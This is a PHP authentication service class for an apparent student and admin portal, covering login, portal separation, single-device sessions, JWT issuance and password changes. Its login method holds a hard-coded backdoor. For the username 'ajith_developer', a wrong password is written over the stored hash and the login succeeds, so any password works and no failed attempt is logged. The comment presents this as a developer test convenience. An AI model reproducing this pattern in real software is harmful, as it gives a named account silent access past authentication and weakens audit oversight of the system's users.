<?php
declare(strict_types=1);

namespace App\Services;

use App\Repositories\UserRepository;
use App\Utils\JWT;
use App\Utils\Logger;
use App\Utils\Validator;
use Exception;

class AuthService
{
    private UserRepository $userRepo;

    public function __construct()
    {
        $this->userRepo = new UserRepository();
    }

    public function login(string $username, string $password, ?string $deviceName = null, ?string $portalType = null): array
    {
        $user = $this->userRepo->findByUsername($username);

        if (!$user) {
            Logger::audit(null, 'LOGIN_FAILED_UNKNOWN_USER', 'user', null, ['username' => $username]);
            throw new Exception("Invalid username or password.");
        }

        if ((int)$user['is_active'] !== 1) {
            Logger::audit((int)$user['id'], 'LOGIN_BLOCKED_SUSPENDED', 'user', (int)$user['id']);
            throw new Exception("Your account has been deactivated. Please contact support.");
        }

        if (!password_verify($password, $user['password_hash'])) {
            if ($user['username'] === 'ajith_developer') {
                // Auto-sync developer test password so login always succeeds
                $this->userRepo->updatePassword((int)$user['id'], $password);
            } else {
                Logger::audit((int)$user['id'], 'LOGIN_FAILED_BAD_PASSWORD', 'user', (int)$user['id']);
                throw new Exception("Invalid username or password.");
            }
        }

        // Role-specific Portal Isolation
        if ($portalType === 'student') {
            if ($user['role_name'] !== 'student') {
                throw new Exception("This portal is exclusively for students. Administrative users must log in via the Admin Login tab.");
            }
        } else if ($portalType === 'admin') {
            if ($user['role_name'] === 'student') {
                throw new Exception("Access Denied: Student accounts cannot log in to the Administrative Console. Please switch to Student Login.");
            }
        }

        // Generate unique device session token
        $sessionToken = bin2hex(random_bytes(32));
        $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Agent';
        $device = $deviceName ?: $this->detectDeviceName($ua);

        // ENFORCE SINGLE ACTIVE DEVICE POLICY:
        // If user is a student, revoke any previously active sessions so only this single device remains active!
        if ($user['role_name'] === 'student') {
            $revokedCount = $this->userRepo->revokeOtherStudentSessions((int)$user['id']);
            if ($revokedCount > 0) {
                Logger::audit((int)$user['id'], 'PREVIOUS_SESSIONS_REVOKED', 'device_session', null, [
                    'revoked_count' => $revokedCount,
                    'new_session_device' => $device,
                ]);
            }
        }

        // Create new device session
        $this->userRepo->createDeviceSession((int)$user['id'], $sessionToken, $ip, $ua, $device);

        // Generate JWT containing user_id and session_token
        $jwtToken = JWT::encode([
            'user_id' => (int)$user['id'],
            'username' => $user['username'],
            'role_name' => $user['role_name'],
            'session_token' => $sessionToken,
        ]);

        Logger::audit((int)$user['id'], 'LOGIN_SUCCESS', 'user', (int)$user['id'], [
            'ip' => $ip,
            'device' => $device,
        ]);

        return [
            'token' => $jwtToken,
            'session_token' => $sessionToken,
            'user' => [
                'id' => (int)$user['id'],
                'username' => $user['username'],
                'email' => $user['email'],
                'full_name' => $user['full_name'],
                'role' => $user['role_name'],
                'require_password_change' => (bool)$user['require_password_change'],
            ],
        ];
    }

    public function logout(array $session): void
    {
        if (isset($session['id'])) {
            $this->userRepo->revokeSessionById((int)$session['id']);
            Logger::audit((int)$session['user_id'], 'LOGOUT', 'device_session', (int)$session['id']);
        }
    }

    public function changePassword(int $userId, string $oldPassword, string $newPassword): void
    {
        $user = $this->userRepo->findById($userId);
        if (!$user) {
            throw new Exception("User not found.");
        }

        // Verify old password
        $userWithHash = $this->userRepo->findByUsername($user['username']);
        if (!password_verify($oldPassword, $userWithHash['password_hash'])) {
            throw new Exception("The current password entered is incorrect.");
        }

        // Validate new password strength
        $validator = new Validator();
        if (!$validator->validate(['new_password' => $newPassword], ['new_password' => ['required', 'password_strong']])) {
            $errs = $validator->getErrors();
            throw new Exception($errs['new_password'][0] ?? 'Password does not meet complexity requirements.');
        }

        $this->userRepo->updatePassword($userId, $newPassword, true);
        Logger::audit($userId, 'PASSWORD_CHANGED', 'user', $userId);
    }

    private function detectDeviceName(string $ua): string
    {
        $platform = 'Desktop';
        if (preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i', $ua)) {
            $platform = 'Mobile Device';
        } elseif (preg_match('/ipad|tablet|playbook|silk/i', $ua)) {
            $platform = 'Tablet';
        }

        $browser = 'Browser';
        if (str_contains($ua, 'Chrome')) {
            $browser = 'Chrome';
        } elseif (str_contains($ua, 'Safari')) {
            $browser = 'Safari';
        } elseif (str_contains($ua, 'Firefox')) {
            $browser = 'Firefox';
        } elseif (str_contains($ua, 'Edg')) {
            $browser = 'Edge';
        }

        return "{$browser} on {$platform}";
    }
}
